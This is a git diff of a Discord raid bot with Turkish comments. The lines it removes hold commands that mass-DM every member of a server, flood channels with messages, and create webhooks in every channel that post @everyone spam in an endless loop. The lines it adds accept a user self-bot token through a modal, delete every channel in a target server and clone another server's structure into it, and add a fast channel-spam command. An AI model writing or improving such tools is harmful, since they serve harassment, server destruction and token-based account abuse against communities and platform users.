@@ -1,14 +1,17 @@
 require('dotenv').config();
-const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ChannelType, PermissionFlagsBits } = require('discord.js');
+const { 
+    Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, 
+    EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, 
+    ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType, ChannelType 
+} = require('discord.js');
+const { Client: SelfClient } = require('discord.js-selfbot-v13');
 const http = require('http');
 
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMembers,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.DirectMessages
+        GatewayIntentBits.MessageContent
     ]
 });
 
@@ -16,119 +19,121 @@ const OWNER_ID = "1389930042200559706";
 
 // --- KOMUTLAR ---
 const commands = [
-    // DM RAID: Sunucudaki herkese sızar
     new SlashCommandBuilder()
-        .setName('dm-raid')
-        .setDescription('Sunucudaki herkese DM atar.')
-        .addStringOption(opt => opt.setName('mesaj').setDescription('Mesaj içeriği').setRequired(true)),
-    
-    // ULTRA SPAM: Mevcut kanala mermi yağdırır
+        .setName('kur-panel')
+        .setDescription('Kopyalama ve Spam panelini açar.'),
     new SlashCommandBuilder()
-        .setName('spam')
-        .setDescription('Bulunduğun kanala izinli/izinsiz seri mesaj atar.')
-        .addStringOption(opt => opt.setName('mesaj').setDescription('Spam metni').setRequired(true))
-        .addIntegerOption(opt => opt.setName('adet').setDescription('Kaç adet?').setRequired(true)),
-
-    // WEBHOOK RAID: Tüm kanalları patlatır
-    new SlashCommandBuilder()
-        .setName('raid')
-        .setDescription('Tüm kanallara Webhook ile saldırır.')
-        .addStringOption(opt => opt.setName('mesaj').setDescription('Spam içeriği').setRequired(true)),
-
-    // COPYCORD CLONER
-    new SlashCommandBuilder()
-        .setName('kur')
-        .setDescription('Copycord Altyapısı: Sunucuyu kopyalar.')
-        .addStringOption(opt => opt.setName('id').setDescription('Kaynak ID').setRequired(true))
+        .setName('hizli-spam')
+        .setDescription('Kanala hızlı mermi yağdırır.')
+        .addStringOption(opt => opt.setName('mesaj').setDescription('Spam içeriği').setRequired(true))
+        .addIntegerOption(opt => opt.setName('adet').setDescription('Kaç adet?').setRequired(true))
 ].map(c => c.toJSON());
 
 client.once('ready', async () => {
-    try {
-        const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);
-        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
-        console.log(`☣️ COPYCORD SYSTEM LOADED: ${client.user.tag}`);
-    } catch (error) {
-        console.error("Komut yükleme hatası:", error);
-    }
+    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);
+    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
+    console.log(`☣️ FORCES ULTRA READY: ${client.user.tag}`);
 });
 
 client.on('interactionCreate', async interaction => {
-    if (!interaction.isChatInputCommand()) return;
-    
-    // Sadece senin ID'n kullanabilir
-    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: "❌ Yetkin yok kanka!", ephemeral: true });
+    // Sadece senin ID'n
+    if (interaction.user.id !== OWNER_ID) return;
 
-    const { commandName, options, guild, channel } = interaction;
+    // 1. PANEL KOMUTU
+    if (interaction.isChatInputCommand() && interaction.commandName === 'kur-panel') {
+        const embed = new EmbedBuilder()
+            .setColor('#2b2d31')
+            .setTitle('👑 FORCES Ultra Sistem')
+            .setDescription('Kopyalama ve Spam işlemleri için aşağıdaki butonu kullan.');
 
-    // --- 1. DM RAID ---
-    if (commandName === 'dm-raid') {
-        const text = options.getString('mesaj');
-        await interaction.reply({ content: "🚀 DM Operasyonu Başladı...", ephemeral: true });
-        
-        const members = await guild.members.fetch();
-        for (const member of members.values()) {
-            if (member.user.bot) continue;
-            member.send(text).catch(() => console.log(`${member.user.tag} kapalı.`));
-            await new Promise(r => setTimeout(r, 1200)); // Hızlı ama ban riskine karşı dengeli
-        }
+        const row = new ActionRowBuilder().addComponents(
+            new ButtonBuilder().setCustomId('btn_ultra_copy').setLabel('Sistemi Başlat').setStyle(ButtonStyle.Danger)
+        );
+        return interaction.reply({ embeds: [embed], components: [row] });
     }
 
-    // --- 2. ULTRA SPAM (Normal Mesaj) ---
-    if (commandName === 'spam') {
-        const text = options.getString('mesaj');
-        const count = options.getInteger('adet');
-        await interaction.reply({ content: `🔥 ${count} adet mesaj gönderiliyor...`, ephemeral: true });
+    // 2. MODAL AÇILIŞI
+    if (interaction.isButton() && interaction.customId === 'btn_ultra_copy') {
+        const modal = new ModalBuilder().setCustomId('modal_ultra_copy').setTitle('Ultra Operasyon Bilgileri');
+        modal.addComponents(
+            new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('t').setLabel('Self/Bot Token').setStyle(TextInputStyle.Short).setRequired(true)),
+            new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('s').setLabel('Kaynak Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true)),
+            new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('h').setLabel('Hedef Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true))
+        );
+        return await interaction.showModal(modal);
+    }
 
-        for (let i = 0; i < count; i++) {
+    // 3. KLONLAMA VE SPAM MANTIĞI (MODAL SUBMIT)
+    if (interaction.type === InteractionType.ModalSubmit && interaction.customId === 'modal_ultra_copy') {
+        await interaction.deferReply({ ephemeral: true });
+
+        const token = interaction.fields.getTextInputValue('t');
+        const srcId = interaction.fields.getTextInputValue('s');
+        const trgId = interaction.fields.getTextInputValue('h');
+
+        const self = new SelfClient({ checkUpdate: false });
+
+        self.on('ready', async () => {
             try {
-                await channel.send(text);
-                await new Promise(r => setTimeout(r, 400)); // 0.4 saniye hız
-            } catch (e) { break; }
-        }
-    }
+                const src = self.guilds.cache.get(srcId);
+                const trg = self.guilds.cache.get(trgId);
 
-    // --- 3. WEBHOOK RAID (Full Sunucu İmhası) ---
-    if (commandName === 'raid') {
-        const text = options.getString('mesaj');
-        await interaction.reply({ content: "☣️ Webhooklar sızıyor...", ephemeral: true });
+                if (!src || !trg) return interaction.editReply('❌ Sunucu bulunamadı!');
 
-        const channels = await guild.channels.fetch();
-        channels.filter(c => c.type === ChannelType.GuildText).forEach(async ch => {
-            try {
-                const wb = await ch.createWebhook({ name: 'Copycord Destroyer', avatar: client.user.displayAvatarURL() });
-                setInterval(() => {
-                    wb.send(`@everyone ${text}`).catch(() => {});
-                }, 800);
-            } catch (err) { console.log("Webhook oluşturulamadı: " + ch.name); }
-        });
-    }
+                // --- FULL KLONLAMA (SENİN KODUNUN GELİŞTİRİLMİŞ HALİ) ---
+                await interaction.editReply('🧹 Temizlik ve Klonlama başladı...');
 
-    // --- 4. COPYCORD CLONER ---
-    if (commandName === 'kur') {
-        const srcId = options.getString('id');
-        const src = client.guilds.cache.get(srcId);
-        if (!src) return interaction.reply("Kaynak bulunamadı!");
+                // Kanalları sil
+                const targetChannels = await trg.channels.fetch();
+                for (const c of targetChannels.values()) {
+                    await c.delete().catch(() => {});
+                    await new Promise(r => setTimeout(r, 500));
+                }
 
-        await interaction.reply("🏗️ Yapı kopyalanıyor...");
-        
-        const currentChans = await guild.channels.fetch();
-        for (const c of currentChans.values()) await c.delete().catch(() => {});
+                // Kanalları ve Kategorileri Oluştur (Gelişmiş Sıralama)
+                const srcChans = await src.channels.fetch();
+                const cats = srcChans.filter(c => c.type === 4 || c.type === 'GUILD_CATEGORY').sort((a,b) => a.position - b.position);
 
-        const srcChans = await src.channels.fetch();
-        const categories = srcChans.filter(c => c.type === ChannelType.GuildCategory).sort((a, b) => a.position - b.position);
+                for (const cat of cats.values()) {
+                    const newCat = await trg.channels.create(cat.name, { type: 4 }).catch(() => null);
+                    if(newCat) {
+                        const children = srcChans.filter(c => c.parentId === cat.id).sort((a,b) => a.position - b.position);
+                        for (const child of children.values()) {
+                            await trg.channels.create(child.name, { 
+                                type: child.type === 2 ? 2 : 0, 
+                                parent: newCat.id 
+                            }).catch(() => {});
+                            await new Promise(r => setTimeout(r, 800));
+                        }
+                    }
+                }
 
-        for (const cat of categories.values()) {
-            const newCat = await guild.channels.create({ name: cat.name, type: ChannelType.GuildCategory });
-            const children = srcChans.filter(c => c.parentId === cat.id).sort((a, b) => a.position - b.position);
-            for (const ch of children.values()) {
-                await guild.channels.create({ name: ch.name, type: ch.type, parent: newCat.id });
-                await new Promise(r => setTimeout(r, 800));
+                await interaction.editReply('✅ Operasyon başarıyla tamamlandı.');
+                self.destroy();
+            } catch (err) {
+                await interaction.editReply('❌ Hata: ' + err.message);
+                self.destroy();
             }
+        });
+
+        self.login(token).catch(() => interaction.editReply('❌ Token hatalı.'));
+    }
+
+    // 4. HIZLI SPAM KOMUTU
+    if (interaction.isChatInputCommand() && interaction.commandName === 'hizli-spam') {
+        const mesaj = interaction.options.getString('mesaj');
+        const adet = interaction.options.getInteger('adet');
+        await interaction.reply({ content: `🔥 ${adet} mermi sürülüyor...`, ephemeral: true });
+
+        for (let i = 0; i < adet; i++) {
+            try {
+                await interaction.channel.send(mesaj);
+                await new Promise(r => setTimeout(r, 400));
+            } catch (e) { break; }
         }
     }
 });
 
-// Render'da uyumaması için port dinleyici
-http.createServer((req, res) => res.end("Copycord System Online")).listen(process.env.PORT || 3000);
-
+// Render 7/24 Uyanık Tutucu
+http.createServer((req, res) => res.end("Forces Online")).listen(process.env.PORT || 3000);
 client.login(process.env.DISCORD_BOT_TOKEN);
